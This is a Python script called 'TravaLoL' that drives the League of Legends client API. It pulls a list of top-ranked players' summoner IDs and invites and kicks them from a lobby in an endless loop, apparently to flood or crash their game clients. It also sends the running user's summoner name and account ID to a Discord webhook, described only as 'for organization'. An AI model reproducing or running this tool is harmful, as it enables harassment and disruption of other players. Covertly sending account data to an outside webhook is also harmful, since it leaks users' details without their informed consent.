import json
import sys
import six
import riotgames_api
from discord_webhook import DiscordWebhook, DiscordEmbed

WEBHOOK_URL = 'Link do webhook (Apenas utilizado para organização).'
lolcapi = riotgames_api.LeagueOfLegendsClientAPI()

Version = "V3 (Kick Method)"

def webhook():
    name = lolcapi.get("/lol-summoner/v1/current-summoner")
    webhook = DiscordWebhook(url=WEBHOOK_URL)
    embed = DiscordEmbed(title='@TravaLoL Info', description='Version: %s' % Version, color=121212)
    embed.set_timestamp()
    embed.add_embed_field(name='Name:', value=name.get("displayName"), inline=False)
    embed.add_embed_field(name='InternalName:', value=name.get("internalName"), inline=False)
    embed.add_embed_field(name='AccountID:', value=name.get("accountId"), inline=False)
    embed.add_embed_field(name='Array:', value=arraytocrash, inline=False)
    webhook.add_embed(embed)
    response = webhook.execute()

def menu():
    print('+----------------------------------------------------------------+')
    print('@TravaLOL - 1. Começar a travar.')
    print('@TravaLOL - 2. Creditos.')
    print('+----------------------------------------------------------------+')
    selection = int(input('@TravaLOL - Selecione uma opção: '))
    if selection == 1:
        try:
            with six.moves.urllib.request.urlopen('Lista que contém os summoners ids em array filtrando apenas os CHALLENGER') as f:
                response = f.read().decode('utf-8')
                responsedata = json.loads(response)
                global array
                global arraytocrash
                count = int(len(responsedata)) - 1
                arraytocrash = int(input('@TravaLOL - Selecione a LISTA entre (0 até %s): ' % count))
                webhook()
                array = responsedata[arraytocrash]
                datanotformated = []
                for i in array:
                    datanotformated.append({"toSummonerId": i})
                global data
                data = json.dumps(datanotformated)
                while True:
                    r2 = lolcapi.post('/lol-lobby/v2/lobby/invitations', datanotformated)
                    print('@TravaLOL - Invite Enviado (%s)' % r2.status_code)  
                    for i in array:
                        r2 = lolcapi.post('/lol-lobby/v2/lobby/members/%s/kick' % i)
                        print('@TravaLOL - Invite Removido (%s)' % r2.status_code)                     
        except Exception as e:
            print('@TravaLoL - Erro, entre em contato conosco.')
    if selection == 2:
        print('@TravaLOL - Creditos para: @TravaLoL')
        menu()   
try:
    menu()
except KeyboardInterrupt:
    sys.exit(0)
